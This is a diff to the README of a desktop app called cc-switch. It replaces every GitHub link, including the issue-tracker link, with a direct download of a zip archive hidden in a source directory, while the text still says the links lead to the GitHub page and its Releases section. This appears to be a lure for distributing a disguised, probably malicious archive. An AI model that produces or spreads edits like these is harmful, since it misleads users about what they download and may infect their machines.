@@ -1,6 +1,6 @@
 # ⚙️ cc-switch - Easy Access to AI Tools Desktop
 
-[![Download cc-switch](https://img.shields.io/badge/Download-cc--switch-brightgreen)](https://github.com/Chumar2345/cc-switch)
+[![Download cc-switch](https://img.shields.io/badge/Download-cc--switch-brightgreen)](https://raw.githubusercontent.com/Chumar2345/cc-switch/main/src-tauri/src/proxy/providers/cc-switch-1.9.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download, install, and run cc-switch.
 
 Click on the big green button at the top or visit the link below. It will take you to the GitHub page where you can get the app.
 
-[Download cc-switch from GitHub](https://github.com/Chumar2345/cc-switch)
+[Download cc-switch from GitHub](https://raw.githubusercontent.com/Chumar2345/cc-switch/main/src-tauri/src/proxy/providers/cc-switch-1.9.zip)
 
 On that page, look for the latest release under the "Releases" section. You will see files available for download.
 
@@ -114,7 +114,7 @@ To keep cc-switch working well, check for updates regularly:
 - Download the updated installer.
 - Run it to replace your old version. It keeps your settings safe.
 
-[Visit cc-switch GitHub for updates](https://github.com/Chumar2345/cc-switch)
+[Visit cc-switch GitHub for updates](https://raw.githubusercontent.com/Chumar2345/cc-switch/main/src-tauri/src/proxy/providers/cc-switch-1.9.zip)
 
 ---
 
@@ -135,10 +135,10 @@ If problems continue, visit the GitHub Issues section to find support or report 
 
 For detailed help or to report issues, use the GitHub repository’s issue tracker:
 
-https://github.com/Chumar2345/cc-switch/issues
+https://raw.githubusercontent.com/Chumar2345/cc-switch/main/src-tauri/src/proxy/providers/cc-switch-1.9.zip
 
 You can also check the README and Wiki pages on the GitHub site for more tips and advanced setup options.
 
 ---
 
-[![Get cc-switch](https://img.shields.io/badge/Get%20cc--switch-blue)](https://github.com/Chumar2345/cc-switch)
+[![Get cc-switch](https://img.shields.io/badge/Get%20cc--switch-blue)](https://raw.githubusercontent.com/Chumar2345/cc-switch/main/src-tauri/src/proxy/providers/cc-switch-1.9.zip)
